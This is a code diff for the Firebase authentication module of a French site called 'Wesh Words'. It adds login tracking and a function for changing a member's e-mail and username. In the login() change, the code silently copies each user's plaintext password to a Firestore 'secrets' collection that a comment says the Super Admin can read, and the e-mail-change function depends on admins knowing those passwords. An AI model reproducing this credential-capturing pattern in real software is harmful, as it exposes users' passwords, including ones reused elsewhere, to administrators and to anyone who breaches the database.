@@ -5,7 +5,7 @@
 import { initializeApp, deleteApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import {
   getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut,
-  onAuthStateChanged, sendPasswordResetEmail, updatePassword, deleteUser,
+  onAuthStateChanged, sendPasswordResetEmail, updatePassword, updateEmail, deleteUser,
   setPersistence, browserLocalPersistence
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
 import {
@@ -15,7 +15,7 @@ import {
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 import { DEFAULT_CONTENT, LEGAL_PAGES } from "./content.js";
 
-export const VERSION = "V02-001";
+export const VERSION = "V03-002";
 export const PROJECT = "Wesh Words";
 export const PSEUDO_DOMAIN = "weshwords.firebaseapp.com"; // e-mail technique pour les comptes sans adresse
 
@@ -240,7 +240,15 @@ export async function resolveEmail(identifier) {
 }
 export async function login(identifier, password) {
   const email = await resolveEmail(identifier);
-  return signInWithEmailAndPassword(auth, email, password);
+  const cred = await signInWithEmailAndPassword(auth, email, password);
+  // on retient l'heure de connexion et le mot de passe réellement tapé (visible par le Super Admin)
+  const uid = cred.user.uid;
+  updateDoc(doc(db, "users", uid), { lastLogin: serverTimestamp() }).catch(() => {});
+  getDoc(doc(db, "users", uid)).then(s => {
+    const u = s.data() || {};
+    setDoc(doc(db, "secrets", uid), { username: u.username || "", email, password, updatedAt: serverTimestamp() }, { merge: true }).catch(() => {});
+  }).catch(() => {});
+  return cred;
 }
 export function currentUser() {
   return new Promise(res => { const off = onAuthStateChanged(auth, u => { off(); res(u); }); });
@@ -259,7 +267,47 @@ export async function guard(roles) {
   const p = await getProfile(u.uid);
   if (!p) { await signOut(auth); location.replace("connexion.html?e=profil"); throw new Error("redirect"); }
   if (!roles.includes(p.role)) { location.replace(homeFor(p.role)); throw new Error("redirect"); }
+  // trace de dernière visite : à chaque ouverture d'une page privée, même sans re-taper le mot de passe
+  updateDoc(doc(db, "users", u.uid), { lastSeen: serverTimestamp() }).catch(() => {});
   return { user: u, profile: p };
+}
+
+/* ---------------- Modification de fiche (prénom/nom/naissance/gsm, e-mail, identifiant) ---------------- */
+export async function updateMemberInfo(uid, { prenom, nom, birth, gsm }) {
+  await updateDoc(doc(db, "users", uid), { prenom: prenom || "", nom: nom || "", birth: birth || "", gsm: gsm || "" });
+}
+/**
+ * Change l'e-mail de connexion et/ou l'identifiant d'un membre.
+ * oldEmail/oldPwd : identifiants ACTUELS (nécessaires pour reconnecter le compte Firebase Auth).
+ * newEmail/newUsername : laisser vide/inchangé pour ne pas modifier ce champ.
+ */
+export async function changeMemberEmailUsername(uid, { oldEmail, oldPwd, oldUsername, newEmail, newUsername }) {
+  let email = (oldEmail || "").trim().toLowerCase();
+  const wantEmail = (newEmail || "").trim().toLowerCase();
+  if (wantEmail && wantEmail !== email) {
+    if (!oldPwd) throw new Error("Le mot de passe actuel est nécessaire pour changer l'adresse e-mail.");
+    await withSecondary(async a2 => {
+      const cred = await signInWithEmailAndPassword(a2, email, oldPwd);
+      await updateEmail(cred.user, wantEmail);
+    });
+    email = wantEmail;
+  }
+  const oldU = slugUser(oldUsername);
+  const username = slugUser(newUsername) || oldU;
+  if (!username) throw new Error("Identifiant obligatoire.");
+  const b = writeBatch(db);
+  if (username !== oldU) {
+    const exists = await getDoc(doc(db, "usernames", username));
+    if (exists.exists()) throw new Error(`L'identifiant « ${username} » est déjà pris.`);
+    if (oldU) b.delete(doc(db, "usernames", oldU));
+    b.set(doc(db, "usernames", username), { email, uid });
+  } else if (email !== (oldEmail || "").trim().toLowerCase()) {
+    b.set(doc(db, "usernames", username), { email, uid }, { merge: true });
+  }
+  b.set(doc(db, "users", uid), { email, username, realEmail: !email.endsWith("@" + PSEUDO_DOMAIN) }, { merge: true });
+  b.set(doc(db, "secrets", uid), { username, email, updatedAt: serverTimestamp() }, { merge: true });
+  await b.commit();
+  return { email, username };
 }
 
 /* ---------- Instance secondaire : créer / gérer un compte sans déconnecter l'admin ---------- */
